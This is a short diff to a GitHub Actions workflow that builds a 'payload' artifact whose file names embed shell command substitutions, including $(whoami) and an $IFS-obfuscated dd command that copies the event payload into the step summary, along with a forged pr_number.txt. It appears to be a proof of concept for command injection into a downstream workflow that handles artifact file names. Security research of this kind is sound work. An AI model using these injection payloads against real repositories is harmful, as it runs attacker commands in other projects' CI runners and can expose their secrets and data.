@@ -10,9 +10,12 @@ jobs:
       - name: craft payload artifact
         run: |
           mkdir -p payload
-          printf 'pwn\n' > 'payload/$(id>&2).txt'
+          printf 'PROOF-OF-CODE-EXECUTION\n' > 'payload/runner.txt'
+          printf 'PROOF-OF-CODE-EXECUTION\n' > 'payload/$(whoami).txt'
+          printf 'PROOF-OF-CODE-EXECUTION\n' > 'payload/$(dd$IFSif=$GITHUB_EVENT_PATH$IFSof=$GITHUB_STEP_SUMMARY).txt'
+          printf '135\n' > 'payload/pr_number.txt'
           ls -la payload
       - uses: actions/upload-artifact@v4
         with:
-          name: content-pwn
+          name: content-proof
           path: payload
